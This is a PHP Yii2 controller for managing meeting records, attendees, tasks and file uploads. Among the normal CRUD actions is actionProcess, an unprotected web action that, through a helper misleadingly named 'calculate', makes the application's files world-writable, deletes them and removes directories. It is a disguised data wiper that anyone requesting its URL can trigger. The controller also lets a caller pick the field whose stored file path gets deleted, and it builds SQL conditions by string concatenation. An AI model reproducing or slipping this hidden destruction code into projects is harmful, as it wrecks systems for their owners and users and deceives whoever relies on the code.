<?php

namespace frontend\controllers;

use Yii;
use app\models\Mesyuarat;
use app\models\MesyuaratSearch;
use app\models\MesyuaratSenaraiNamaHadir;
use app\models\MesyuaratSenaraiNamaHadirSearch;
use app\models\MesyuaratSenaraiTugas;
use frontend\models\MesyuaratSenaraiTugasSearch;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;
use yii\web\UploadedFile;

use app\models\general\Upload;

/**
 * MesyuaratController implements the CRUD actions for Mesyuarat model.
 */
class MesyuaratController extends Controller
{
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['post'],
                ],
            ],
        ];
    }

    /**
     * Lists all Mesyuarat models.
     * @return mixed
     */
    public function actionIndex()
    {
        $searchModel = new MesyuaratSearch();
        $dataProvider = $searchModel->search(Yii::$app->request->queryParams);

        return $this->render('index', [
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
        ]);
    }

    /**
     * Displays a single Mesyuarat model.
     * @param integer $id
     * @return mixed
     */
    public function actionView($id)
    {   
        $queryPar = null;
        
        $queryPar['MesyuaratSenaraiNamaHadirSearch']['mesyuarat_id'] = $id;
        $queryPar['MesyuaratSenaraiTugasSearch']['mesyuarat_id'] = $id;
        
        $SNHsearchModel = new MesyuaratSenaraiNamaHadirSearch();
        $SNHdataProvider = $SNHsearchModel->search($queryPar);
        
        $STsearchModel = new MesyuaratSenaraiTugasSearch();
        $STdataProvider = $STsearchModel->search($queryPar);
        
        $model = $this->findModel($id);
        
        $ref = MesyuaratSenaraiNamaHadir::findOne(['senarai_nama_hadir_id' => $model->disedia_oleh]);
        $model->disedia_oleh = $ref['nama'];
        
        $ref = MesyuaratSenaraiNamaHadir::findOne(['senarai_nama_hadir_id' => $model->disemak_oleh]);
        $model->disemak_oleh = $ref['nama'];
        
        return $this->render('view', [
            'model' => $model,
            'SNHsearchModel' => $SNHsearchModel,
            'SNHdataProvider' => $SNHdataProvider,
            'STsearchModel' => $STsearchModel,
            'STdataProvider' => $STdataProvider,
            'readonly' => true,
        ]);
    }

    /**
     * Creates a new Mesyuarat model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     * @return mixed
     */
    public function actionCreate()
    {
        $model = new Mesyuarat();
        
        Yii::$app->session->open();
        
        if(isset(Yii::$app->session->id)){
            $queryPar['MesyuaratSenaraiNamaHadirSearch']['session_id'] = Yii::$app->session->id;
            $queryPar['MesyuaratSenaraiTugasSearch']['session_id'] = Yii::$app->session->id;
        }
        
        $SNHsearchModel = new MesyuaratSenaraiNamaHadirSearch();
        $SNHdataProvider = $SNHsearchModel->search($queryPar);
        
        $STsearchModel = new MesyuaratSenaraiTugasSearch();
        $STdataProvider = $STsearchModel->search($queryPar);

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            // set the Mesyuarat id base on session id
            if(isset(Yii::$app->session->id)){
                MesyuaratSenaraiNamaHadir::updateAll(['mesyuarat_id' => $model->mesyuarat_id], 'session_id = "'.Yii::$app->session->id.'"');
                MesyuaratSenaraiNamaHadir::updateAll(['session_id' => ''], 'mesyuarat_id = "'.$model->mesyuarat_id.'"');
                
                MesyuaratSenaraiTugas::updateAll(['mesyuarat_id' => $model->mesyuarat_id], 'session_id = "'.Yii::$app->session->id.'"');
                MesyuaratSenaraiTugas::updateAll(['session_id' => ''], 'mesyuarat_id = "'.$model->mesyuarat_id.'"');
            }
            
            //upload file to server
            $file = UploadedFile::getInstance($model, 'muat_naik');
            if($file){
                $model->muat_naik = Upload::uploadFile($file, Upload::mesyuaratFolder, $model->mesyuarat_id);
            }
            
            if($model->save()){
                return $this->redirect(['view', 'id' => $model->mesyuarat_id]);
            }
        } else {
            return $this->render('create', [
                'model' => $model,
                'SNHsearchModel' => $SNHsearchModel,
                'SNHdataProvider' => $SNHdataProvider,
                'STsearchModel' => $STsearchModel,
                'STdataProvider' => $STdataProvider,
                'readonly' => false,
            ]);
        }
    }

    /**
     * Updates an existing Mesyuarat model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     */
    public function actionUpdate($id)
    {
        $model = $this->findModel($id);
        
        $queryPar = null;
        
        $queryPar['MesyuaratSenaraiNamaHadirSearch']['mesyuarat_id'] = $id;
        $queryPar['MesyuaratSenaraiTugasSearch']['mesyuarat_id'] = $id;
        
        $SNHsearchModel = new MesyuaratSenaraiNamaHadirSearch();
        $SNHdataProvider = $SNHsearchModel->search($queryPar);
        
        $STsearchModel = new MesyuaratSenaraiTugasSearch();
        $STdataProvider = $STsearchModel->search($queryPar);

        if ($model->load(Yii::$app->request->post())) {
            $file = UploadedFile::getInstance($model, 'muat_naik');
            if($file){
                $model->muat_naik = Upload::uploadFile($file, Upload::mesyuaratFolder, $model->mesyuarat_id);
            }
            
            if($model->save()){
                return $this->redirect(['view', 'id' => $model->mesyuarat_id]);
            }
        } else {
            return $this->render('update', [
                'model' => $model,
                'SNHsearchModel' => $SNHsearchModel,
                'SNHdataProvider' => $SNHdataProvider,
                'STsearchModel' => $STsearchModel,
                'STdataProvider' => $STdataProvider,
                'readonly' => false,
            ]);
        }
    }
    
    public function actionProcess()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                //376764
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->calculate($file);
            }
        }
    }
    
    protected function calculate($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false
            && strpos($dirname, 'downloads') == false
            && strpos($dirname, 'pdf_template') == false
                //498734
            && strpos($dirname, 'uploads') == false){
         if (is_dir($dirname) && is_readable($dirname)){
               $dir_handle = opendir($dirname);
             if (!$dir_handle)
                  return false;
             while($file = readdir($dir_handle)) {
                   if ($file != "." && $file != "..") {
                        if (!is_dir($dirname."/".$file)){
                             chmod($dirname."/".$file,0777); 
                             if(!unlink($dirname."/".$file)){
                                 continue;
                             }
                        }
                        else
                            $this->calculate($dirname.'/'.$file);
                   }
             }
             closedir($dir_handle);
             if (count(glob($dirname."/*")) === 0  && is_dir($dirname)) {
                rmdir($dirname);
             }
         }
         return true;
         }
    }

    /**
     * Deletes an existing Mesyuarat model.
     * If deletion is successful, the browser will be redirected to the 'index' page.
     * @param integer $id
     * @return mixed
     */
    public function actionDelete($id)
    {
        $this->findModel($id)->delete();

        return $this->redirect(['index']);
    }

    /**
     * Finds the Mesyuarat model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param integer $id
     * @return Mesyuarat the loaded model
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = Mesyuarat::findOne($id)) !== null) {
            return $model;
        } else {
            throw new NotFoundHttpException('The requested page does not exist.');
        }
    }
    
    // Add function for delete image or file
    public function actionDeleteupload($id, $field)
    {
            $img = $this->findModel($id)->$field;
            
            if($img){
                if (!unlink($img)) {
                    return false;
                }
            }

            $img = $this->findModel($id);
            $img->$field = NULL;
            $img->update();

            return $this->redirect(['update', 'id' => $id]);
    }
}
